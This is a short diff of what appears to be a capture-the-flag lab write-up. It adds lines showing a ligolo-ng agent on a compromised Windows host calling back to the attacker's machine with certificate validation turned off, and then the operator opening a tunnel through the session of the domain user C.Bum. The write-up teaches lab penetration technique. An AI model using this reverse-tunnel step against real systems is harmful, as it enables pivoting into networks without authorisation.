@@ -676,5 +676,16 @@ agent.exe -connect 10.10.14.90:11601 --ignore-cert
 time="2026-04-01T14:56:49-07:00" level=warning msg="warning, certificate validation disabled"
 time="2026-04-01T14:56:49-07:00" level=info msg="Connection established" addr="10.10.14.90:11601"
 ```
-This triggered a con
+This triggered a connection back to me
+
+```python
+ligolo-ng » session
+? Specify a session : 1 - flight\C.Bum@g0 - 10.129.228.120:56529 - 00505694ba82
+[Agent : flight\C.Bum@g0] » tunnel_start --tun flight
+INFO[0300] Starting tunnel to flight\C.Bum@g0 (00505694ba82) 
+[Agent : flight\C.Bum@g0] » 
+```
+This shows me getting the connection and starting the tunnel 
+
+N
 
